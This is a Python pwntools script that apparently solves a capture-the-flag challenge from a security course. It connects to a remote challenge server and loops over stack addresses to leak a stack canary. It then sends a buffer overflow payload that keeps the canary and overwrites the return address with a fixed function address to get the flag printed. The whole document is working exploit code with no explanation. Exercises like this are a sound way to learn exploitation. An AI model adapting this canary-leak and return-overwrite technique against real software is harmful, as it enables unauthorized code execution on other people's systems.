from pwn import *

for i in range(0x7ffffffff000, 0x7fffffffb000-0x8, -0x4):
    try:
        io = remote('inf226.puffling.no', 7003)
        flag_address = p64(0x4011d6)
        io.recvline()
        buffer = b'a' * 32 + p64(i)
        io.sendline(buffer)

        canary1 = io.recvline(16)
        canary2 = canary1.decode()
        canary = int(canary2, 16)

        payload = b'q' + b'a' * 31 + p64(i) + p64(canary) + b'a' * 8 + flag_address
        io.recvuntil(b'Do not, for one repulse, forego the purpose that you resolved to effect -William Shakespeare, The Tempest\n')
        io.sendline(payload)

        answer = io.recvall(1)
        print(answer)
        if 'INF226' in answer.decode():
            print(answer)
            break

    except Exception as exception:
        print(exception)        